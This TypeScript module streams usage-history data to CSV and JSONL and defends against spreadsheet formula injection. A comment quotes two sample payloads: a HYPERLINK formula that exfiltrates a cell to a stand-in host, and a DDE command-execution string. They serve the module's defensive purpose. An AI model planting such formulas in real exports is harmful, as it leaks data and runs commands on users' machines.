/**
 * Safe, streaming export of tabular data (usage history) to CSV and JSONL.
 *
 * Nothing here touches the database on purpose: the caller pages rows out of
 * SQLite and feeds them in, so a 200k-row history never has to exist as one
 * string in memory.
 */

export type ExportRow = Record<string, unknown>;

export interface ExportColumn {
  /** Property read from the row. */
  key: string;
  /** Header cell. Defaults to the key, so downstream scripts can rely on it. */
  header?: string;
}

export type ColumnSpec = string | ExportColumn;

export type ExportFormat = "csv" | "jsonl";

export interface StreamExportOptions {
  columns?: readonly ColumnSpec[];
  /**
   * Rows per emitted chunk. Bigger chunks mean fewer syscalls downstream,
   * smaller chunks mean a lower memory ceiling.
   */
  chunkRows?: number;
}

/**
 * RFC 4180 uses CRLF between records. Excel on Windows is the main consumer of
 * these files and is the least forgiving about a bare LF.
 */
const CRLF = "\r\n";

/**
 * Stable column order for usage exports.
 *
 * Frozen deliberately: an export whose columns shift between releases silently
 * breaks every expense script and pivot table built on a previous file. New
 * columns get appended to the end, never inserted.
 */
export const USAGE_EXPORT_COLUMNS: readonly ExportColumn[] = Object.freeze([
  { key: "id", header: "id" },
  { key: "ts", header: "timestamp" },
  { key: "providerSlug", header: "provider_slug" },
  { key: "providerName", header: "provider_name" },
  { key: "modelId", header: "model_id" },
  { key: "modelLabel", header: "model_label" },
  { key: "taskSlug", header: "task_slug" },
  { key: "taskLabel", header: "task_label" },
  { key: "source", header: "source" },
  { key: "prompt", header: "prompt" },
  { key: "response", header: "response" },
  { key: "inputTokens", header: "input_tokens" },
  { key: "outputTokens", header: "output_tokens" },
  { key: "totalTokens", header: "total_tokens" },
  { key: "cachedTokens", header: "cached_tokens" },
  { key: "reasoningTokens", header: "reasoning_tokens" },
  { key: "contextWindow", header: "context_window" },
  { key: "costUsd", header: "cost_usd" },
  { key: "inputCostUsd", header: "input_cost_usd" },
  { key: "outputCostUsd", header: "output_cost_usd" },
  { key: "latencyMs", header: "latency_ms" },
  { key: "tokensPerSec", header: "tokens_per_sec" },
  { key: "estimated", header: "estimated" },
  { key: "ok", header: "ok" },
  { key: "error", header: "error" },
]);

function normalizeColumns(columns: readonly ColumnSpec[]): ExportColumn[] {
  return columns.map((c) => (typeof c === "string" ? { key: c, header: c } : c));
}

/** Column order inferred from the data, first-seen wins, so it stays stable. */
function inferColumns(rows: readonly ExportRow[]): ExportColumn[] {
  const keys: string[] = [];
  const seen = new Set<string>();
  for (const row of rows) {
    for (const k of Object.keys(row)) {
      if (!seen.has(k)) {
        seen.add(k);
        keys.push(k);
      }
    }
  }
  return keys.map((k) => ({ key: k, header: k }));
}

/**
 * Render one cell as text.
 *
 * null and undefined become an empty cell, never the literal "null": a
 * spreadsheet SUM() over a column of "null" strings reads as zero rows, and an
 * accountant cannot tell "no value" from a value spelled n-u-l-l.
 */
export function formatValue(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "string") return value;
  if (typeof value === "number") {
    // NaN and Infinity have no spreadsheet meaning and would land as text
    // inside a numeric column, poisoning every aggregate over it.
    return Number.isFinite(value) ? String(value) : "";
  }
  if (typeof value === "boolean") return value ? "true" : "false";
  if (typeof value === "bigint") return value.toString();
  if (value instanceof Date) {
    return Number.isNaN(value.getTime()) ? "" : value.toISOString();
  }
  try {
    return JSON.stringify(value) ?? "";
  } catch {
    return "";
  }
}

/**
 * Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
 * formula rather than text.
 */
const FORMULA_PREFIXES = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * CSV injection (a.k.a. formula injection) defence.
 *
 * A cell whose first character is =, +, - or @ is evaluated as a formula when
 * the file is opened, so a prompt logged as
 *   =HYPERLINK("http://evil.tld?x="&A1,"click")
 * exfiltrates the neighbouring cell, and =cmd|'/c calc'!A1 has been used for
 * command execution on Windows. The file is data we hand to a user, so no cell
 * may ever be executable.
 *
 * The fix is a leading apostrophe, which spreadsheets consume as a "this is
 * text" marker and do not display. Applied to every cell, including numeric
 * ones, so a negative number exports as text rather than a number. That is the
 * accepted cost: a wrong-looking cell beats an executing one.
 */
export function neutralizeFormula(field: string): string {
  if (field.length === 0) return field;
  return FORMULA_PREFIXES.has(field[0]) ? `'${field}` : field;
}

/**
 * RFC 4180 field escaping: a field containing a comma, a double quote, CR or
 * LF is wrapped in double quotes, and any inner double quote is doubled.
 *
 * Prompts routinely contain all three, so a naive join(",") produces a file
 * whose row and column counts disagree with the data.
 */
export function escapeCsvField(value: unknown): string {
  const safe = neutralizeFormula(formatValue(value));
  const mustQuote =
    safe.includes(",") ||
    safe.includes('"') ||
    safe.includes("\n") ||
    safe.includes("\r") ||
    // A leading apostrophe we just added, or leading/trailing spaces, survive
    // more readers intact inside quotes.
    safe.startsWith("'");
  return mustQuote ? `"${safe.replaceAll('"', '""')}"` : safe;
}

function csvLine(cells: readonly string[]): string {
  return cells.join(",") + CRLF;
}

export function csvHeaderLine(columns: readonly ColumnSpec[]): string {
  return csvLine(normalizeColumns(columns).map((c) => escapeCsvField(c.header ?? c.key)));
}

export function csvRowLine(row: ExportRow, columns: readonly ColumnSpec[]): string {
  return csvLine(normalizeColumns(columns).map((c) => escapeCsvField(row[c.key])));
}

/**
 * Whole-file CSV. Use streamExport for anything user-sized; this exists for
 * small result sets and as the reference output the stream must match byte for
 * byte.
 */
export function toCsv(
  rows: readonly ExportRow[],
  columns?: readonly ColumnSpec[],
): string {
  const cols = normalizeColumns(columns ?? inferColumns(rows));
  let out = csvHeaderLine(cols);
  for (const row of rows) out += csvRowLine(row, cols);
  return out;
}

/** One row as a single-line JSON object, terminated by LF. */
export function jsonlLine(row: ExportRow, columns?: readonly ColumnSpec[]): string {
  if (!columns) return JSON.stringify(row) + "\n";
  const projected: ExportRow = {};
  for (const c of normalizeColumns(columns)) {
    // undefined would be dropped by JSON.stringify, leaving rows with
    // different key sets; null keeps every line the same shape.
    projected[c.key] = row[c.key] === undefined ? null : row[c.key];
  }
  return JSON.stringify(projected) + "\n";
}

/**
 * Newline-delimited JSON. Each line is an independent document, so a consumer
 * can parse the file one line at a time instead of buffering an entire array
 * before the first record is usable.
 */
export function toJsonl(
  rows: readonly ExportRow[],
  columns?: readonly ColumnSpec[],
): string {
  let out = "";
  for (const row of rows) out += jsonlLine(row, columns);
  return out;
}

export function contentTypeFor(format: ExportFormat): string {
  return format === "csv" ? "text/csv; charset=utf-8" : "application/x-ndjson";
}

/**
 * Chunked export. Yields strings whose concatenation is exactly the output of
 * toCsv / toJsonl, so a Response body can be streamed to disk without the full
 * export ever being resident.
 */
export async function* streamExport(
  rows: Iterable<ExportRow> | AsyncIterable<ExportRow>,
  format: ExportFormat = "csv",
  options: StreamExportOptions = {},
): AsyncGenerator<string, void, undefined> {
  const chunkRows = Math.max(1, Math.trunc(options.chunkRows ?? 200));
  const cols = options.columns ? normalizeColumns(options.columns) : undefined;

  if (format === "csv") {
    // Without an explicit column list the header cannot be known until every
    // row has been seen, which defeats streaming. Fail loudly rather than emit
    // a file whose columns depend on which page happened to arrive first.
    if (!cols) {
      throw new Error("streamExport(csv) requires options.columns for a stable header");
    }
    yield csvHeaderLine(cols);
  }

  let buffer = "";
  let buffered = 0;
  for await (const row of rows as AsyncIterable<ExportRow>) {
    buffer += format === "csv" ? csvRowLine(row, cols!) : jsonlLine(row, cols);
    buffered++;
    if (buffered >= chunkRows) {
      yield buffer;
      buffer = "";
      buffered = 0;
    }
  }
  if (buffer.length > 0) yield buffer;
}

/** Collect a stream back into one string. Handy in tests and small handlers. */
export async function collectStream(
  chunks: AsyncIterable<string>,
): Promise<string> {
  let out = "";
  for await (const chunk of chunks) out += chunk;
  return out;
}
